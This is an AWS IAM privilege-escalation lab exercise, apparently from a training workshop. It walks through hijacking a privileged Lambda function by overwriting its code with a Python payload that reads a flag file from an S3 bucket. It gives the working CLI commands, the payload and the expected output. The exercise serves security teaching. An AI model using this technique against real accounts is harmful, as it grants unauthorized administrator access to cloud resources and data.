## Exercise 6: UpdateFunctionCode - Existing PassRole

**Category:** Existing PassRole
**Starting IAM Principal:** `iamws-lambda-developer-user`
**Target:** `iamws-privileged-lambda` (with `iamws-privileged-lambda-role`)

**The Vulnerability:** The `iamws-lambda-developer-user` can update the code of ANY Lambda function—including functions that have privileged execution roles. By replacing the code with a malicious payload, they can exfiltrate the Lambda's credentials.

**Real-world scenario:** A developer can deploy code to Lambda functions but shouldn't be able to access production resources. If they can modify ANY Lambda (not just their own), they can target Lambdas with privileged roles and use the Lambda function to execute code targeting resources the Lambda execution role can access.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-lambda-developer-user do lambda:UpdateFunctionCode with *"
```

Check the escalation path:
```bash
pmapper analysis --output-type text | grep -A2 "iamws-lambda-developer-user"
```

Expected output:
```
* user/iamws-lambda-developer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-lambda-role:
   * user/iamws-lambda-developer-user can use Lambda to edit an existing
     function (arn:aws:lambda:...:function:iamws-privileged-lambda)
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud Lambda-003](https://pathfinding.cloud/paths/lambda-003):

- **Category:** Existing PassRole
- **Required Permission:** `lambda:UpdateFunctionCode` (unrestricted)
- **Root Cause:** Can modify ANY Lambda, not just designated ones
- **Impact:** Access to any Lambda's execution role

Unlike "New PassRole" where you CREATE new compute, "Existing PassRole" exploits EXISTING compute that already has a role attached.

### Part C: Exploit the Vulnerability

**Step 1: Try to access the crown jewels**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-lambda-developer-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-lambda-developer-user
```

**Expected:** `Forbidden` — this Lambda developer can't reach the crown jewels... yet.

**Step 2: Find the privileged Lambda**
```bash
aws lambda list-functions \
  --query 'Functions[?starts_with(FunctionName, `iamws`)].{Name:FunctionName,Role:Role}' \
  --output table \
  --profile iamws-lambda-developer-user
```

You'll see `iamws-privileged-lambda` with role `iamws-privileged-lambda-role` (which has `AdministratorAccess`).

**Step 3: View the target function's role**
```bash
aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.Role' --output text \
  --profile iamws-lambda-developer-user
```

**Step 4: Save the original code hash for reference**

Before replacing the function code, capture its current SHA-256 hash. This lets you confirm the code actually changed after the update — and in a real scenario, a defender could use this to detect unauthorized modifications.

```bash
ORIGINAL_HASH=$(aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.CodeSha256' --output text \
  --profile iamws-lambda-developer-user)
echo "Original code hash: $ORIGINAL_HASH"
```

**Step 5: Write a malicious Lambda payload**

First, create a working directory for the exploit:

```bash
mkdir -p /tmp/iamws-exploit
```

Now write a Python handler that will run as the Lambda's privileged execution role. This code calls `sts:GetCallerIdentity` to prove which role it's running as, then reads the crown jewels from S3 — something only an admin role can do:

```bash
cat > /tmp/iamws-exploit/lambda_function.py << 'PYEOF'
import boto3
import json

def handler(event, context):
    sts = boto3.client('sts')
    s3 = boto3.client('s3')

    identity = sts.get_caller_identity()

    # Grab the crown jewels from S3
    bucket = f"iamws-crown-jewels-{identity['Account']}"
    obj = s3.get_object(Bucket=bucket, Key='flag.txt')
    crown_jewels = obj['Body'].read().decode('utf-8')

    return {
        'statusCode': 200,
        'identity': {
            'Account': identity['Account'],
            'Arn': identity['Arn'],
            'UserId': identity['UserId']
        },
        'crown_jewels': crown_jewels
    }
PYEOF
```

**Step 6: Package the payload**

Lambda expects code as a zip archive. Package the handler:

```bash
cd /tmp/iamws-exploit && zip -j exploit.zip lambda_function.py
cd -
```

**Step 7: Update the function code**
```bash
aws lambda update-function-code \
  --function-name iamws-privileged-lambda \
  --zip-file fileb:///tmp/iamws-exploit/exploit.zip \
  --profile iamws-lambda-developer-user
```

**Step 8: Invoke the function and claim the crown jewels**
```bash
aws lambda invoke \
  --function-name iamws-privileged-lambda \
  --payload '{}' \
  /tmp/iamws-exploit/response.json \
  --profile iamws-lambda-developer-user

cat /tmp/iamws-exploit/response.json | jq .
```

**Expected output:**
```json
{
  "statusCode": 200,
  "identity": {
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/iamws-privileged-lambda-role/iamws-privileged-lambda",
    "UserId": "AROA..."
  },
  "crown_jewels": "  ============================================\n     YOU FOUND THE CROWN JEWELS! ..."
}
```

**You just hijacked a privileged Lambda function** by replacing its code to read the crown jewels from S3 and return the contents in the response. The Lambda's identity is `iamws-privileged-lambda-role` with `AdministratorAccess`.

### What You Learned

- **lambda:UpdateFunctionCode** with `Resource: "*"` allows hijacking any Lambda
- In this example you told the Lambda to read from S3, but with this vulnerability you could hijack Lambda function code to do all sorts of bad things with AWS services
- Existing PassRole attacks target compute that ALREADY has privileged roles

---

**Next:** [Exercise 7: GetFunctionConfiguration](exercise-7.md) — Credential access via Lambda environment variables
